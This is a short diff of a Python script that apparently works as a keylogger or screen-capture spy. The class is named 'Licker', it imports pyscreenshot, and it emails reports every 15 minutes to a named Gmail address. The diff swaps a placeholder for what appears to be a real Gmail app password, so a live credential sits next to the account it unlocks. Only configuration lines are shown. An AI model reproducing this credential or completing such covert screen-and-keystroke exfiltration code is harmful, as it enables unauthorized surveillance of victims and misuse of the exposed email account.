@@ -13,7 +13,7 @@ import pyscreenshot as ImageGrab
 SEND_REPORT_EVERY = 900  # 15 minutes
 EMAIL_ADDRESS = "sankarideb1@gmail.com"
 # CRITICAL: Use a 16-character 'App Password' here instead of your regular password.
-EMAIL_PASSWORD = "your_app_password_here" 
+EMAIL_PASSWORD = "vkfm hbqm yhon cvjg" 
 
 class Licker:
     def __init__(self, interval):
